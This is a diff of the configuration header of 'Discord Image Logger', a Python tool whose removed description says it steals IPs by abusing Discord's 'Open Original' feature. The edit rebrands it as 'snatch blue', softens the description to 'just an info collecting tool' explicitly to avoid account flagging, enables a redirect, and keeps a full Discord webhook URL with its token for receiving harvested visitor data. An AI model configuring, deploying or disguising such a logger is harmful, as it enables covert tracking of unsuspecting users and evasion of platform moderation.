@@ -1,24 +1,26 @@
-# Discord Image Logger
+# Formerly named "Discord Image Logger" (its a good name but I dont want to get my account flagged/suspended!!)
 # By DeKrypt | https://github.com/dekrypted
+# Remade by fishyramen, 99.9% of credit goes to DeKrypt, (he's a genius like me) all i did was fix it to work again | https://github.com/fishyramen
+# If it don't work it might be because when switching false to true or true to false you have to make the first letter in caps like "False" or "True" or it won't work!!
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__app__ = "snatch blue"
+__description__ = "just an info collecting tool"
+__version__ = "v1.0"
+__author__ = "fishyramen"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1516801634607300718/Oxff-9d3wzdxswuzYR3kkxNWppbYKccMaV4K9yazpQCykb6IaQ7C-1_7-mh70nYIzVkC",
-    "image": "https://i.pinimg.com/736x/d4/04/06/d404061e84b1d3f0d968d3c19f979771.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/736x/a4/86/ae/a486ae95fd7fb539774352ece2221313.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "snatch blue", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -37,7 +39,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
@@ -50,8 +52,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://bigrat.monster/" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
